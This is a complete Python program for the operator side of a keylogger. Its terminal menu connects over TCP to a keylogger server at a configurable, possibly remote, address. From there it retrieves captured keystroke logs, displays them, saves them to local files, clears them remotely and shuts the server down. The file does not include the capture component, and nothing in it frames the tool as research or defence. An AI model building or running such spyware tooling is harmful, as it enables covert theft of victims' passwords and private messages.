#!/usr/bin/env python3
"""
Menu-based Keylogger Client
- Interactive terminal menu with options for:
  1) Display logs
  2) Save logs to file 
  3) Turn off server
- Simple and reliable operation
"""

import socket
import json
import sys
import time
import os
from datetime import datetime

class KeyloggerClient:
    def __init__(self):
        self.host = "127.0.0.1"
        self.port = 9999
        self.client_socket = None
        self.connected = False
        self.logs = []
        
    def connect(self):
        """Connect to the keylogger server"""
        if self.connected:
            return True
            
        print(f"\nConnecting to server at {self.host}:{self.port}...")
        
        try:
            # Create socket
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.settimeout(10)  # 10 second timeout
            self.client_socket.connect((self.host, self.port))
            
            # Get welcome message
            response = self.client_socket.recv(1024)
            response_data = json.loads(response.decode('utf-8'))
            
            if response_data.get('status') == 'ok':
                print(f"Successfully connected to server at {self.host}:{self.port}")
                self.connected = True
                return True
            else:
                print(f"Error connecting to server: {response_data.get('message', 'Unknown error')}")
                self.client_socket.close()
                self.client_socket = None
                return False
        
        except socket.timeout:
            print(f"Connection timed out when connecting to {self.host}:{self.port}")
            if self.client_socket:
                self.client_socket.close()
                self.client_socket = None
            return False
        except ConnectionRefusedError:
            print(f"Connection refused. Is the server running at {self.host}:{self.port}?")
            if self.client_socket:
                self.client_socket.close()
                self.client_socket = None
            return False
        except Exception as e:
            print(f"Error connecting to server: {str(e)}")
            if self.client_socket:
                self.client_socket.close()
                self.client_socket = None
            return False
    
    def disconnect(self):
        """Disconnect from the server"""
        if not self.connected:
            return
            
        try:
            self.client_socket.close()
        except:
            pass
            
        self.client_socket = None
        self.connected = False
        print("Disconnected from server")
    
    def get_logs(self, lines=100):
        """Get logs from the server"""
        if not self.connected:
            if not self.connect():
                return False
        
        try:
            # Request logs
            command = {
                "action": "get_logs",
                "lines": lines
            }
            self.client_socket.send(json.dumps(command).encode('utf-8'))
            
            # Receive response
            self.client_socket.settimeout(15)  # Longer timeout for receiving logs
            
            # Get response with better handling for large data
            data = b""
            while True:
                chunk = self.client_socket.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(chunk) < 4096:
                    break
            
            # Parse response
            response = json.loads(data.decode('utf-8'))
            
            if response.get('status') == 'ok':
                self.logs = response.get('logs', [])
                return True
            else:
                print(f"Error getting logs: {response.get('message', 'Unknown error')}")
                return False
        
        except socket.timeout:
            print("Timeout while receiving logs")
            self.disconnect()
            return False
        except Exception as e:
            print(f"Error getting logs: {str(e)}")
            self.disconnect()
            return False
    
    def clear_logs(self):
        """Clear logs on the server"""
        if not self.connected:
            if not self.connect():
                return False
        
        try:
            # Send clear request
            command = {
                "action": "clear_logs"
            }
            self.client_socket.send(json.dumps(command).encode('utf-8'))
            
            # Get response
            response = json.loads(self.client_socket.recv(1024).decode('utf-8'))
            
            if response.get('status') == 'ok':
                print("Logs cleared successfully")
                return True
            else:
                print(f"Error clearing logs: {response.get('message', 'Unknown error')}")
                return False
        
        except Exception as e:
            print(f"Error clearing logs: {str(e)}")
            self.disconnect()
            return False
    
    def save_logs_to_file(self, filename):
        """Save logs to a file"""
        if not self.logs:
            if not self.get_logs():
                print("Failed to get logs from server")
                return False
        
        if not self.logs:
            print("No logs to save")
            return False
        
        try:
            with open(filename, 'w') as f:
                for log in self.logs:
                    f.write(log)
            
            print(f"Logs saved to {filename}")
            return True
        
        except Exception as e:
            print(f"Error saving logs: {str(e)}")
            return False
    
    def stop_server(self):
        """Send command to stop the server"""
        if not self.connected:
            if not self.connect():
                return False
        
        try:
            # Ask for confirmation
            confirm = input("Are you sure you want to stop the server? (y/n): ")
            if confirm.lower() != 'y':
                print("Operation cancelled")
                return False
            
            # Send stop request
            command = {
                "action": "stop_server"
            }
            self.client_socket.send(json.dumps(command).encode('utf-8'))
            
            # Try to get response (may not receive if server stops immediately)
            try:
                self.client_socket.settimeout(3)
                response = json.loads(self.client_socket.recv(1024).decode('utf-8'))
                
                if response.get('status') == 'ok':
                    print("Server is shutting down")
                    return True
                else:
                    print(f"Error stopping server: {response.get('message', 'Unknown error')}")
                    return False
            except:
                # If we get no response, assume server is stopping
                print("Server is shutting down")
                return True
        
        except Exception as e:
            print(f"Error stopping server: {str(e)}")
            return False
        finally:
            self.disconnect()


def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')


def print_header():
    """Print the application header"""
    clear_screen()
    print("=" * 60)
    print("             KEYLOGGER CLIENT - MENU INTERFACE             ")
    print("=" * 60)
    print()


def print_menu():
    """Print the main menu"""
    print("\nMAIN MENU:")
    print("-" * 60)
    print("1. Display Logs")
    print("2. Save Logs to File")
    print("3. Turn Off Server")
    print("4. Set Server Connection Details")
    print("5. Exit")
    print("-" * 60)
    choice = input("Enter your choice (1-5): ")
    return choice


def display_logs(client):
    """Display logs option"""
    print_header()
    print("DISPLAY LOGS")
    print("-" * 60)
    
    lines = 100
    try:
        lines_input = input("Enter number of lines to display (default: 100): ")
        if lines_input.strip():
            lines = int(lines_input)
    except ValueError:
        print("Invalid input, using default of 100 lines")
    
    print(f"\nFetching {lines} log lines...")
    if not client.get_logs(lines):
        print("Failed to get logs from server")
        input("\nPress Enter to return to the menu...")
        return
    
    if not client.logs:
        print("No logs available from server")
        input("\nPress Enter to return to the menu...")
        return
    
    # Display logs
    print("\n" + "="*60)
    print(f"DISPLAYING {len(client.logs)} LOG ENTRIES:")
    print("="*60 + "\n")
    
    for log in client.logs:
        print(log.rstrip())
    
    print("\n" + "="*60)
    input("\nPress Enter to return to the menu...")


def save_logs(client):
    """Save logs to file option"""
    print_header()
    print("SAVE LOGS TO FILE")
    print("-" * 60)
    
    # Ask for filename
    filename = input("Enter filename to save logs (default: keylogger_logs.txt): ")
    if not filename.strip():
        filename = "keylogger_logs.txt"
    
    # Ask for number of lines
    lines = 100
    try:
        lines_input = input("Enter number of lines to save (default: 100, 0 for all): ")
        if lines_input.strip():
            lines = int(lines_input)
    except ValueError:
        print("Invalid input, using default of 100 lines")
    
    # Get logs
    print(f"\nFetching {lines} log lines...")
    if not client.get_logs(lines):
        print("Failed to get logs from server")
        input("\nPress Enter to return to the menu...")
        return
    
    if not client.logs:
        print("No logs available from server")
        input("\nPress Enter to return to the menu...")
        return
    
    # Save to file
    if client.save_logs_to_file(filename):
        print(f"\nSuccessfully saved {len(client.logs)} log entries to {filename}")
    else:
        print("\nFailed to save logs to file")
    
    input("\nPress Enter to return to the menu...")


def turn_off_server(client):
    """Turn off server option"""
    print_header()
    print("TURN OFF SERVER")
    print("-" * 60)
    print("WARNING: This will shut down the keylogger server.")
    print("         All connected clients will be disconnected.")
    
    client.stop_server()
    
    input("\nPress Enter to return to the menu...")


def set_connection_details(client):
    """Set server connection details"""
    print_header()
    print("SET SERVER CONNECTION DETAILS")
    print("-" * 60)
    
    # Get current settings
    print(f"Current host: {client.host}")
    print(f"Current port: {client.port}")
    print("-" * 60)
    
    # Get new settings
    new_host = input("Enter new host (leave empty to keep current): ")
    if new_host.strip():
        client.host = new_host
    
    new_port = input("Enter new port (leave empty to keep current): ")
    if new_port.strip():
        try:
            port = int(new_port)
            if 1 <= port <= 65535:
                client.port = port
            else:
                print("Port must be between 1 and 65535, keeping current port")
        except ValueError:
            print("Invalid port number, keeping current port")
    
    # If already connected, disconnect
    if client.connected:
        print("Disconnecting from current server...")
        client.disconnect()
    
    # Try to connect with new settings
    print(f"Trying to connect to {client.host}:{client.port}...")
    if client.connect():
        print("Connection successful!")
    else:
        print("Could not connect with new settings. Will try again when needed.")
    
    input("\nPress Enter to return to the menu...")


def main():
    """Main application function"""
    client = KeyloggerClient()
    
    while True:
        print_header()
        choice = print_menu()
        
        if choice == '1':
            display_logs(client)
        elif choice == '2':
            save_logs(client)
        elif choice == '3':
            turn_off_server(client)
        elif choice == '4':
            set_connection_details(client)
        elif choice == '5':
            if client.connected:
                client.disconnect()
            print("\nExiting Keylogger Client. Goodbye!")
            break
        else:
            print("\nInvalid choice. Please try again.")
            time.sleep(1)
    
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\nOperation cancelled by user. Exiting...")
        sys.exit(0)